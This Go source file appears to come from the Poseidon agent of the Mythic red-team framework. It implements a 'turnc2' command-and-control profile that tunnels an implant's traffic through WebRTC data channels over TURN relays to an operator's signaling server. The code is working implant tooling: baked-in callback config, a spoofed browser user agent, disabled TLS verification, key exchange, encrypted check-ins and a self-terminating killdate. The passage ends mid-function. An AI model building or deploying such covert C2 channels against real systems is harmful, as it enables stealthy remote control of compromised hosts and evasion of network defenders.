//go:build (linux || darwin) && turnc2

package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/andybalholm/brotli"
	"github.com/pion/ice/v2"
	pionlog "github.com/pion/logging"
	pion "github.com/pion/webrtc/v3"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// debugLoggerFactory routes pion's internal logs through utils.PrintDebug
type debugLoggerFactory struct{}

func (f *debugLoggerFactory) NewLogger(scope string) pionlog.LeveledLogger {
	return &debugLogger{scope: scope}
}

type debugLogger struct {
	scope string
}

func (l *debugLogger) Trace(msg string)                          { utils.PrintDebug(fmt.Sprintf("[pion:%s] TRACE %s\n", l.scope, msg)) }
func (l *debugLogger) Tracef(format string, args ...interface{}) { utils.PrintDebug(fmt.Sprintf("[pion:%s] TRACE %s\n", l.scope, fmt.Sprintf(format, args...))) }
func (l *debugLogger) Debug(msg string)                          { utils.PrintDebug(fmt.Sprintf("[pion:%s] DEBUG %s\n", l.scope, msg)) }
func (l *debugLogger) Debugf(format string, args ...interface{}) { utils.PrintDebug(fmt.Sprintf("[pion:%s] DEBUG %s\n", l.scope, fmt.Sprintf(format, args...))) }
func (l *debugLogger) Info(msg string)                           { utils.PrintDebug(fmt.Sprintf("[pion:%s] INFO %s\n", l.scope, msg)) }
func (l *debugLogger) Infof(format string, args ...interface{})  { utils.PrintDebug(fmt.Sprintf("[pion:%s] INFO %s\n", l.scope, fmt.Sprintf(format, args...))) }
func (l *debugLogger) Warn(msg string)                           { utils.PrintDebug(fmt.Sprintf("[pion:%s] WARN %s\n", l.scope, msg)) }
func (l *debugLogger) Warnf(format string, args ...interface{})  { utils.PrintDebug(fmt.Sprintf("[pion:%s] WARN %s\n", l.scope, fmt.Sprintf(format, args...))) }
func (l *debugLogger) Error(msg string)                          { utils.PrintDebug(fmt.Sprintf("[pion:%s] ERROR %s\n", l.scope, msg)) }
func (l *debugLogger) Errorf(format string, args ...interface{}) { utils.PrintDebug(fmt.Sprintf("[pion:%s] ERROR %s\n", l.scope, fmt.Sprintf(format, args...))) }

// turnc2_initial_config is set at compile time via ldflags
var turnc2_initial_config string

type Turnc2InitialConfig struct {
	CallbackHost           string
	CallbackPort           uint
	SignalURI              string
	TurnServer             string
	TurnUsername           string
	TurnPassword           string
	SDPOffer               string
	Killdate               string
	Interval               uint
	Jitter                 uint
	EncryptedExchangeCheck bool
	AESPSK                 string
	UserAgent              string
}

func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["callback_host"]; ok {
		e.CallbackHost = v.(string)
	}
	if v, ok := alias["callback_port"]; ok {
		e.CallbackPort = uint(v.(float64))
	}
	if v, ok := alias["signal_uri"]; ok {
		e.SignalURI = v.(string)
	}
	if v, ok := alias["turn_server"]; ok {
		e.TurnServer = v.(string)
	}
	if v, ok := alias["turn_username"]; ok {
		e.TurnUsername = v.(string)
	}
	if v, ok := alias["turn_password"]; ok {
		e.TurnPassword = v.(string)
	}
	if v, ok := alias["sdp_offer"]; ok {
		e.SDPOffer = v.(string)
	}
	if v, ok := alias["killdate"]; ok {
		e.Killdate = v.(string)
	}
	if v, ok := alias["callback_interval"]; ok {
		e.Interval = uint(v.(float64))
	}
	if v, ok := alias["callback_jitter"]; ok {
		e.Jitter = uint(v.(float64))
	}
	if v, ok := alias["encrypted_exchange_check"]; ok {
		e.EncryptedExchangeCheck = v.(bool)
	}
	if v, ok := alias["AESPSK"]; ok {
		e.AESPSK = v.(string)
	}
	if v, ok := alias["USER_AGENT"]; ok {
		e.UserAgent = v.(string)
	}
	return nil
}

// OfferPayload is the decoded SDP offer from the server.
// The offer_id is embedded in the payload so the agent can reference it
// when posting its minimal answer.
type OfferPayload struct {
	OfferID    string           `json:"offer_id"`
	OfferSDP   string           `json:"offer_sdp"`
	ICEServers []pion.ICEServer `json:"ice_servers"`
}

// signalingResponse is the JSON response from the signaling server.
type signalingResponse struct {
	Status            string `json:"status"`
	Error             string `json:"error,omitempty"`
	ServerRelayAddr   string `json:"server_relay_addr,omitempty"`
	ServerRelayPort   int    `json:"server_relay_port,omitempty"`
	ServerICEUfrag    string `json:"server_ice_ufrag,omitempty"`
	ServerICEPwd      string `json:"server_ice_pwd,omitempty"`
	ServerFingerprint string `json:"server_fingerprint,omitempty"`
}

type C2Turnc2 struct {
	SignalURL             string
	SignalURI             string
	TurnServer            string
	TurnUsername          string
	TurnPassword          string
	SDPOffer              string
	OfferID               string
	Interval              int
	Jitter                int
	ExchangingKeys        bool
	Key                   string
	RsaPrivateKey         *rsa.PrivateKey
	PeerConn              *pion.PeerConnection
	DataChan              *pion.DataChannel
	Lock                  sync.RWMutex
	ReconnectLock         sync.RWMutex
	Killdate              time.Time
	FinishedStaging       bool
	ShouldStop            bool
	stoppedChannel        chan bool
	PushChannel           chan structs.MythicMessage
	interruptSleepChannel chan bool
	UserAgent        string
	// channel to receive complete reassembled messages
	recvChannel      chan []byte
	// channel to signal data channel is open
	dataChannelReady chan bool
	// reassembly state for chunked receives
	recvBuf       []byte
	recvExpected  int
	recvBufMu     sync.Mutex
}

func (c *C2Turnc2) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"SignalURL":     c.SignalURL,
		"SignalURI":     c.SignalURI,
		"TurnServer":   c.TurnServer,
		"Interval":     c.Interval,
		"Jitter":       c.Jitter,
		"EncryptionKey": c.Key,
		"KillDate":     c.Killdate,
	}
	return json.Marshal(alias)
}

func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(turnc2_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial turnc2 config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := Turnc2InitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial turnc2 config, exiting: %v\n", err))
		os.Exit(1)
	}

	// Build the signaling URL
	var signalURL string
	if initialConfig.CallbackPort == 443 && strings.Contains(initialConfig.CallbackHost, "https://") {
		signalURL = initialConfig.CallbackHost
	} else if initialConfig.CallbackPort == 80 && strings.Contains(initialConfig.CallbackHost, "http://") {
		signalURL = initialConfig.CallbackHost
	} else {
		signalURL = fmt.Sprintf("%s:%d", initialConfig.CallbackHost, initialConfig.CallbackPort)
	}
	// Remove trailing slash if present
	signalURL = strings.TrimRight(signalURL, "/")

	profile := C2Turnc2{
		SignalURL:             signalURL,
		SignalURI:             initialConfig.SignalURI,
		TurnServer:            initialConfig.TurnServer,
		TurnUsername:          initialConfig.TurnUsername,
		TurnPassword:          initialConfig.TurnPassword,
		SDPOffer:              initialConfig.SDPOffer,
		Key:                   initialConfig.AESPSK,
		UserAgent:             initialConfig.UserAgent,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		PushChannel:           make(chan structs.MythicMessage, 100),
		interruptSleepChannel: make(chan bool, 1),
		recvChannel:           make(chan []byte, 100),
		dataChannelReady:      make(chan bool, 1),
	}

	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck

	if len(profile.UserAgent) == 0 {
		profile.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
	}

	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile.Killdate = killDateTime

	RegisterAvailableC2Profile(&profile)
	go profile.CreateMessagesForEgressConnections()
}

func (c *C2Turnc2) ProfileName() string {
	return "turnc2"
}

func (c *C2Turnc2) IsP2P() bool {
	return false
}

func (c *C2Turnc2) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2Turnc2) GetPushChannel() chan structs.MythicMessage {
	if !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}

func (c *C2Turnc2) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	return 0 // push-based, no sleep needed
}

func (c *C2Turnc2) GetSleepInterval() int {
	return c.Interval
}

func (c *C2Turnc2) GetSleepJitter() int {
	return c.Jitter
}

func (c *C2Turnc2) GetKillDate() time.Time {
	return c.Killdate
}

func (c *C2Turnc2) SetSleepInterval(interval int) string {
	return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
}

func (c *C2Turnc2) SetSleepJitter(jitter int) string {
	return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
}

func (c *C2Turnc2) Sleep() {
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.Interval)):
	}
}

func (c *C2Turnc2) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2Turnc2) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2Turnc2) UpdateConfig(parameter string, value string) {
	changingConnectionParameter := false
	switch parameter {
	case "SignalURL":
		c.SignalURL = value
		changingConnectionParameter = true
	case "SignalURI":
		c.SignalURI = value
		changingConnectionParameter = true
	case "TurnServer":
		c.TurnServer = value
		changingConnectionParameter = true
	case "TurnUsername":
		c.TurnUsername = value
		changingConnectionParameter = true
	case "TurnPassword":
		c.TurnPassword = value
		changingConnectionParameter = true
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
	case "EncryptionKey":
		c.Key = value
		SetAllEncryptionKeys(c.Key)
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	}
	if changingConnectionParameter {
		c.Stop()
		go c.Start()
	}
}

func (c *C2Turnc2) Start() {
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	go c.CheckForKillDate()
	c.getData()
}

func (c *C2Turnc2) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	if c.PeerConn != nil {
		c.PeerConn.Close()
	}
	utils.PrintDebug(fmt.Sprintf("issued stop to turnc2\n"))
	<-c.stoppedChannel
	utils.PrintDebug(fmt.Sprintf("turnc2 fully stopped\n"))
}

func (c *C2Turnc2) CheckForKillDate() {
	for {
		if c.ShouldStop {
			return
		}
		time.Sleep(time.Duration(60) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}

// establishWebRTC decodes the stamped SDP offer and sets up the WebRTC peer connection
func (c *C2Turnc2) establishWebRTC() error {
	if c.SDPOffer == "" {
		return fmt.Errorf("no SDP offer configured")
	}

	// Decode the stamped offer (Brotli + Base64 → JSON)
	decompressed, err := decompressBase64(c.SDPOffer)
	if err != nil {
		return fmt.Errorf("failed to decompress SDP offer: %w", err)
	}

	var offerPayload OfferPayload
	if err := json.Unmarshal(decompressed, &offerPayload); err != nil {
		return fmt.Errorf("failed to parse SDP offer: %w", err)
	}

	if offerPayload.OfferSDP == "" {
		return fmt.Errorf("SDP offer payload missing offer_sdp")
	}

	// Read the offer_id from the decoded offer payload
	if offerPayload.OfferID != "" {
		c.OfferID = offerPayload.OfferID
	}
	if c.OfferID == "" {
		return fmt.Errorf("no offer_id found in SDP offer payload")
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] offer_id=%s, offer SDP length=%d\n", c.OfferID, len(offerPayload.OfferSDP)))
	utils.PrintDebug(fmt.Sprintf("[turnc2] ICE servers in offer: %d\n", len(offerPayload.ICEServers)))
	for i, srv := range offerPayload.ICEServers {
		utils.PrintDebug(fmt.Sprintf("[turnc2]   ICE server[%d]: URLs=%v\n", i, srv.URLs))
	}

	// Configure ICE servers - use the ones from the offer if available, otherwise use config
	iceServers := offerPayload.ICEServers
	if len(iceServers) == 0 && c.TurnServer != "" {
		iceServers = []pion.ICEServer{
			{
				URLs:       []string{c.TurnServer},
				Username:   c.TurnUsername,
				Credential: c.TurnPassword,
			},
		}
	}

	settingEngine := pion.SettingEngine{}
	settingEngine.SetICEMulticastDNSMode(ice.MulticastDNSModeDisabled)
	settingEngine.SetNetworkTypes([]pion.NetworkType{
		pion.NetworkTypeUDP4,
		pion.NetworkTypeUDP6,
		pion.NetworkTypeTCP4,
		pion.NetworkTypeTCP6,
	})
	settingEngine.SetICETimeouts(
		30*time.Second, // disconnected timeout
		5*time.Minute,  // failed timeout
		10*time.Second, // keepalive interval
	)
	settingEngine.SetRelayAcceptanceMinWait(0)
	// Route pion's internal logs through debug output so we can see
	// TURN allocation failures, ICE errors, etc.
	settingEngine.LoggerFactory = &debugLoggerFactory{}

	api := pion.NewAPI(pion.WithSettingEngine(settingEngine))

	rtcConfig := pion.Configuration{
		ICEServers:         iceServers,
		ICETransportPolicy: pion.ICETransportPolicyRelay,
	}

	pc, err := api.NewPeerConnection(rtcConfig)
	if err != nil {
		return fmt.Errorf("failed to create peer connection: %w", err)
	}

	// Reset channels and reassembly state for new connection
	c.recvChannel = make(chan []byte, 100)
	c.dataChannelReady = make(chan bool, 1)
	c.recvBufMu.Lock()
	c.recvBuf = nil
	c.recvExpected = 0
	c.recvBufMu.Unlock()

	// Log ICE candidates as they are gathered
	pc.OnICECandidate(func(candidate *pion.ICECandidate) {
		if candidate == nil {
			utils.PrintDebug("[turnc2] ICE candidate gathering finished (nil sentinel)\n")
			return
		}
		utils.PrintDebug(fmt.Sprintf("[turnc2] ICE candidate: %s\n", candidate.String()))
	})

	// Set up data channel handler
	pc.OnDataChannel(func(dc *pion.DataChannel) {
		utils.PrintDebug(fmt.Sprintf("data channel received: %s\n", dc.Label()))
		c.DataChan = dc

		dc.OnOpen(func() {
			utils.PrintDebug(fmt.Sprintf("data channel open: %s\n", dc.Label()))
			select {
			case c.dataChannelReady <- true:
			default:
			}
		})

		dc.OnMessage(func(msg pion.DataChannelMessage) {
			if c.ShouldStop {
				return
			}
			c.handleChunkedRecv(msg.Data)
		})

		dc.OnClose(func() {
			utils.PrintDebug(fmt.Sprintf("data channel closed\n"))
		})
	})

	// Monitor connection state
	pc.OnConnectionStateChange(func(state pion.PeerConnectionState) {
		utils.PrintDebug(fmt.Sprintf("WebRTC connection state: %s\n", state.String()))
		switch state {
		case pion.PeerConnectionStateDisconnected, pion.PeerConnectionStateFailed, pion.PeerConnectionStateClosed:
			if !c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("WebRTC connection lost, will reconnect\n"))
			}
		}
	})

	// Set the remote description (offer from server)
	utils.PrintDebug(fmt.Sprintf("[turnc2] setting remote description (server offer)\n"))
	remoteSDP := pion.SessionDescription{
		Type: pion.SDPTypeOffer,
		SDP:  offerPayload.OfferSDP,
	}
	if err := pc.SetRemoteDescription(remoteSDP); err != nil {
		pc.Close()
		return fmt.Errorf("failed to set remote description: %w", err)
	}

	// Create answer
	utils.PrintDebug(fmt.Sprintf("[turnc2] creating WebRTC answer\n"))
	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		pc.Close()
		return fmt.Errorf("failed to create answer: %w", err)
	}

	if err := pc.SetLocalDescription(answer); err != nil {
		pc.Close()
		return fmt.Errorf("failed to set local description: %w", err)
	}

	// Wait for ICE gathering to complete
	utils.PrintDebug(fmt.Sprintf("[turnc2] waiting for ICE gathering to complete...\n"))
	gatherComplete := pion.GatheringCompletePromise(pc)
	<-gatherComplete
	utils.PrintDebug(fmt.Sprintf("[turnc2] ICE gathering complete\n"))

	// Get the final answer with ICE candidates
	finalAnswer := pc.LocalDescription()
	utils.PrintDebug(fmt.Sprintf("[turnc2] local SDP:\n%s\n", finalAnswer.SDP))

	// Extract the minimal answer fields from the local SDP
	relayAddr, relayPort := extractRelayCandidate(finalAnswer.SDP)
	if relayAddr == "" || relayPort == 0 {
		pc.Close()
		utils.PrintDebug(fmt.Sprintf("[turnc2] no relay candidate found in local SDP, full SDP dumped above\n"))
		return fmt.Errorf("no relay candidate found in local SDP")
	}

	iceUfrag, icePwd := extractICECredentials(finalAnswer.SDP)
	if iceUfrag == "" || icePwd == "" {
		pc.Close()
		return fmt.Errorf("no ICE credentials found in local SDP")
	}

	fingerprint := extractFingerprint(finalAnswer.SDP)
	if fingerprint == "" {
		pc.Close()
		return fmt.Errorf("no DTLS fingerprint found in local SDP")
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] minimal answer: relay=%s:%d ufrag=%s fingerprint=%s\n",
		relayAddr, relayPort, iceUfrag, fingerprint))

	// Send the minimal answer to the signaling server
	sigResp, err := c.sendMinimalAnswer(c.OfferID, relayAddr, relayPort, iceUfrag, icePwd, fingerprint)
	if err != nil {
		pc.Close()
		return fmt.Errorf("failed to send minimal answer: %w", err)
	}

	// Handle reconnect response — server created a fresh PC with new ICE creds.
	// We need to create a new PC using the server's new offer details and POST again.
	if sigResp.Status == "reconnect" && sigResp.ServerICEUfrag != "" {
		utils.PrintDebug(fmt.Sprintf("reconnect: server has new ICE creds (ufrag=%s, relay=%s:%d), creating fresh PC\n",
			sigResp.ServerICEUfrag, sigResp.ServerRelayAddr, sigResp.ServerRelayPort))

		// Close the current PC — it was created using the old server offer
		pc.Close()

		// Build a synthetic server offer SDP from the reconnect response
		syntheticOffer := buildSyntheticOffer(sigResp.ServerICEUfrag, sigResp.ServerICEPwd,
			sigResp.ServerFingerprint)

		utils.PrintDebug(fmt.Sprintf("[turnc2] synthetic server offer SDP:\n%s\n", syntheticOffer))

		// Create a new peer connection
		newPC, err := api.NewPeerConnection(rtcConfig)
		if err != nil {
			return fmt.Errorf("reconnect: failed to create new peer connection: %w", err)
		}

		// Reset channels and reassembly state
		c.recvChannel = make(chan []byte, 100)
		c.dataChannelReady = make(chan bool, 1)
		c.recvBufMu.Lock()
		c.recvBuf = nil
		c.recvExpected = 0
		c.recvBufMu.Unlock()

		// Set up handlers on the new PC
		newPC.OnICECandidate(func(candidate *pion.ICECandidate) {
			if candidate == nil {
				return
			}
			utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect ICE candidate: %s\n", candidate.String()))
		})
		newPC.OnDataChannel(func(dc *pion.DataChannel) {
			utils.PrintDebug(fmt.Sprintf("reconnect data channel received: %s\n", dc.Label()))
			c.DataChan = dc
			dc.OnOpen(func() {
				utils.PrintDebug(fmt.Sprintf("reconnect data channel open: %s\n", dc.Label()))
				select {
				case c.dataChannelReady <- true:
				default:
				}
			})
			dc.OnMessage(func(msg pion.DataChannelMessage) {
				if c.ShouldStop {
					return
				}
				c.handleChunkedRecv(msg.Data)
			})
			dc.OnClose(func() {
				utils.PrintDebug("reconnect data channel closed\n")
			})
		})
		newPC.OnConnectionStateChange(func(state pion.PeerConnectionState) {
			utils.PrintDebug(fmt.Sprintf("reconnect WebRTC state: %s\n", state.String()))
		})

		// Set the synthetic server offer as remote description
		remoteSDP := pion.SessionDescription{
			Type: pion.SDPTypeOffer,
			SDP:  syntheticOffer,
		}
		if err := newPC.SetRemoteDescription(remoteSDP); err != nil {
			newPC.Close()
			return fmt.Errorf("reconnect: failed to set remote description: %w", err)
		}

		// Trickle the server's relay candidate
		serverCandidateStr := fmt.Sprintf("candidate:1 1 udp 16777215 %s %d typ relay raddr 0.0.0.0 rport 0",
			sigResp.ServerRelayAddr, sigResp.ServerRelayPort)
		if err := newPC.AddICECandidate(pion.ICECandidateInit{
			Candidate: serverCandidateStr,
		}); err != nil {
			newPC.Close()
			return fmt.Errorf("reconnect: failed to add server relay candidate: %w", err)
		}

		// Create new answer
		newAnswer, err := newPC.CreateAnswer(nil)
		if err != nil {
			newPC.Close()
			return fmt.Errorf("reconnect: failed to create answer: %w", err)
		}
		if err := newPC.SetLocalDescription(newAnswer); err != nil {
			newPC.Close()
			return fmt.Errorf("reconnect: failed to set local description: %w", err)
		}

		// Wait for ICE gathering
		gatherComplete2 := pion.GatheringCompletePromise(newPC)
		<-gatherComplete2

		finalAnswer2 := newPC.LocalDescription()
		newRelayAddr, newRelayPort := extractRelayCandidate(finalAnswer2.SDP)
		if newRelayAddr == "" || newRelayPort == 0 {
			newPC.Close()
			return fmt.Errorf("reconnect: no relay candidate in new answer")
		}
		newUfrag, newPwd := extractICECredentials(finalAnswer2.SDP)
		newFingerprint := extractFingerprint(finalAnswer2.SDP)

		utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect: sending second POST with new answer (relay=%s:%d)\n",
			newRelayAddr, newRelayPort))

		// Send second minimal answer
		sigResp2, err := c.sendMinimalAnswer(c.OfferID, newRelayAddr, newRelayPort, newUfrag, newPwd, newFingerprint)
		if err != nil {
			newPC.Close()
			return fmt.Errorf("reconnect: second signaling POST failed: %w", err)
		}
		if sigResp2.Status == "error" {
			newPC.Close()
			return fmt.Errorf("reconnect: second signaling error: %s", sigResp2.Error)
		}

		utils.PrintDebug(fmt.Sprintf("[turnc2] reconnect: second POST status=%s\n", sigResp2.Status))
		pc = newPC
	}

	c.PeerConn = pc

	// Wait for data channel to be ready
	select {
	case <-c.dataChannelReady:
		utils.PrintDebug("data channel ready\n")
	case <-time.After(30 * time.Second):
		pc.Close()
		return fmt.Errorf("timed out waiting for data channel")
	}

	return nil
}

// sendMinimalAnswer POSTs the minimal answer fields to the signaling endpoint.
// The server uses these to construct a synthetic SDP answer and trickle the
// agent's relay candidate — no full SDP exchange needed.
func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, iceUfrag, icePwd, fingerprint string) (*signalingResponse, error) {
	url := fmt.Sprintf("%s%s", c.SignalURL, c.SignalURI)

	payload := struct {
		OfferID     string `json:"offer_id"`
		RelayAddr   string `json:"relay_addr"`
		RelayPort   int    `json:"relay_port"`
		ICEUfrag    string `json:"ice_ufrag"`
		ICEPwd      string `json:"ice_pwd"`
		Fingerprint string `json:"fingerprint"`
	}{
		OfferID:     offerID,
		RelayAddr:   relayAddr,
		RelayPort:   relayPort,
		ICEUfrag:    iceUfrag,
		ICEPwd:      icePwd,
		Fingerprint: fingerprint,
	}

	reqBody, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal minimal answer: %w", err)
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] POST %s (%d bytes)\n", url, len(reqBody)))
	utils.PrintDebug(fmt.Sprintf("[turnc2] request body: %s\n", string(reqBody)))

	req, err := http.NewRequest("POST", url, bytes.NewReader(reqBody))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", c.UserAgent)

	resp, err := c.httpClient().Do(req)
	if err != nil {
		return nil, fmt.Errorf("signaling request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] response: status=%d body=%s\n", resp.StatusCode, string(body)))

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("signaling server returned %d: %s", resp.StatusCode, string(body))
	}

	var sigResp signalingResponse
	if err := json.Unmarshal(body, &sigResp); err != nil {
		return nil, fmt.Errorf("failed to parse signaling response: %w", err)
	}

	if sigResp.Status == "error" {
		return nil, fmt.Errorf("signaling error: %s", sigResp.Error)
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] signaling success: status=%s server_relay=%s:%d\n",
		sigResp.Status, sigResp.ServerRelayAddr, sigResp.ServerRelayPort))
	return &sigResp, nil
}

func (c *C2Turnc2) httpClient() *http.Client {
	return &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
}

// reconnect tears down the existing connection and establishes a new one
func (c *C2Turnc2) reconnect() {
	if c.ShouldStop {
		return
	}
	c.ReconnectLock.Lock()
	defer c.ReconnectLock.Unlock()

	if c.PeerConn != nil {
		c.PeerConn.Close()
		c.PeerConn = nil
	}
	c.DataChan = nil

	for {
		if c.ShouldStop {
			return
		}
		utils.PrintDebug("attempting WebRTC reconnection\n")
		if err := c.establishWebRTC(); err != nil {
			utils.PrintDebug(fmt.Sprintf("reconnect failed: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(1 * time.Second)
			continue
		}
		utils.PrintDebug("WebRTC reconnected successfully\n")

		if c.FinishedStaging {
			go c.CheckIn()
		} else if c.ExchangingKeys {
			go c.NegotiateKey()
		} else {
			go c.CheckIn()
		}
		break
	}
}

func (c *C2Turnc2) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	checkinMsg, err := json.Marshal(checkin)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
	}
	for {
		if c.ShouldStop {
			return structs.CheckInMessageResponse{}
		}
		if c.ExchangingKeys {
			for !c.NegotiateKey() {
				utils.PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
				if c.ShouldStop {
					return structs.CheckInMessageResponse{}
				}
			}
		}
		c.SendMessage(checkinMsg)
		// Push-based: response comes via getData()
		return structs.CheckInMessageResponse{}
	}
}

func (c *C2Turnc2) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	raw, err := json.Marshal(initMessage)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
		return false
	}
	c.SendMessage(raw)
	// Push-based: response comes via getData()
	return true
}

func (c *C2Turnc2) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID)
	} else {
		return false
	}
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
	c.ExchangingKeys = false
	SetAllEncryptionKeys(c.Key)
	return true
}

// SendMessage encrypts, prepends UUID, base64 encodes, and sends over the data channel
func (c *C2Turnc2) SendMessage(output []byte) []byte {
	if c.ShouldStop {
		return nil
	}
	c.Lock.Lock()
	defer c.Lock.Unlock()

	if len(c.Key) != 0 {
		output = c.encryptMessage(output)
	}

	if GetMythicID() != "" {
		output = append([]byte(GetMythicID()), output...)
	} else {
		output = append([]byte(UUID), output...)
	}

	utils.PrintDebug(fmt.Sprintf("[turnc2] SendMessage: %d bytes\n", len(output)))

	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			return nil
		}
		if c.DataChan == nil || c.DataChan.ReadyState() != pion.DataChannelStateOpen {
			c.reconnect()
			if c.ShouldStop {
				return nil
			}
		}

		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}

		if err := c.sendChunked(output); err != nil {
			utils.PrintDebug(fmt.Sprintf("Error sending data over data channel: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			time.Sleep(1 * time.Second)
			continue
		}
		return nil
	}
	return nil
}

// handleChunkedRecv reassembles length-prefixed chunked messages.
// Format: first chunk starts with 4-byte big-endian total length, followed by data.
// Subsequent chunks are pure data.
func (c *C2Turnc2) handleChunkedRecv(chunk []byte) {
	c.recvBufMu.Lock()
	defer c.recvBufMu.Unlock()

	if c.recvExpected == 0 {
		// Start of a new message — read the 4-byte length prefix
		if len(chunk) < 4 {
			utils.PrintDebug(fmt.Sprintf("[turnc2] recv chunk too small for length prefix: %d bytes\n", len(chunk)))
			return
		}
		c.recvExpected = int(chunk[0])<<24 | int(chunk[1])<<16 | int(chunk[2])<<8 | int(chunk[3])
		c.recvBuf = make([]byte, 0, c.recvExpected)
		chunk = chunk[4:] // skip the length prefix
	}

	c.recvBuf = append(c.recvBuf, chunk...)

	if len(c.recvBuf) >= c.recvExpected {
		// Complete message received
		msg := c.recvBuf[:c.recvExpected]
		c.recvBuf = nil
		c.recvExpected = 0
		c.recvChannel <- msg
	}
}

const maxChunkSize = 60000 // well under SCTP's 65536 limit

// sendChunked sends data over the data channel with length-prefixed framing.
// Format: first chunk starts with 4-byte big-endian total length, followed by data.
// Subsequent chunks are pure data. Receiver reassembles based on the length prefix.
func (c *C2Turnc2) sendChunked(data []byte) error {
	totalLen := len(data)
	// Build the framed message: [4-byte length][data]
	frame := make([]byte, 4+totalLen)
	frame[0] = byte(totalLen >> 24)
	frame[1] = byte(totalLen >> 16)
	frame[2] = byte(totalLen >> 8)
	frame[3] = byte(totalLen)
